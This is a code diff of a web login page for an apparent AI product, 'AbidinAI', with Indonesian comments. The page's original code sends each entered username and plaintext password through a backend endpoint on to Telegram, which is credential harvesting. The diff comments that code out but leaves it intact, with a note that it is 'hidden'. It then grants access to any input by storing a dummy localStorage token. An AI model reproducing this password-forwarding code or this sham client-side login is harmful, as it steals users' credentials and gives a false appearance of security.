@@ -130,6 +130,7 @@
   </style>
   
   <script>
+    // FUNGSI SEKALI LOGIN: Cek status token
     if (localStorage.getItem("abidinai_token")) {
       window.location.href = "dasboard.html"; 
     }
@@ -164,8 +165,11 @@
       return;
     }
 
+    // Bagian pengiriman data disembunyikan (diubah menjadi komentar)
+    /*
     const message = `🔐 Login:\n👤 Username: ${username}\n🔑 Password: ${password}`;
 
+    // Kirim ke backend untuk diteruskan ke Telegram
     fetch("/api/telegram", {
       method: "POST",
       headers: {
@@ -174,15 +178,17 @@
       body: JSON.stringify({ text: message })
     })
     .then(() => {
-      
+    */
+      // Simpan token dummy agar dianggap sudah login
       localStorage.setItem("abidinai_token", "token_sederhana");
-      alert("✅ Akses Diberikan. Mengarahkan ke AbidinAI...");
       window.location.href = "dasboard.html";
+    /*
     })
     .catch((error) => {
-      console.error("Gagal..:", error);
+      console.error("Gagal kirim ke Telegram via backend:", error);
       alert("❌ Akses Ditolak. Periksa kredensial.");
     });
+    */
   }
 
   function togglePassword() {
@@ -190,10 +196,10 @@
     const toggleBtn = document.getElementById("togglePassword");
     if (passInput.type === "password") {
       passInput.type = "text";
-      toggleBtn.innerHTML = '<i class="fas fa-lock-open"></i>';
+      toggleBtn.innerHTML = '<i class="fas fa-lock-open"></i>'; // Ganti ikon menjadi terbuka
     } else {
       passInput.type = "password";
-      toggleBtn.innerHTML = '<i class="fas fa-lock"></i>'; 
+      toggleBtn.innerHTML = '<i class="fas fa-lock"></i>'; // Ganti ikon menjadi terkunci
     }
   }
 </script>
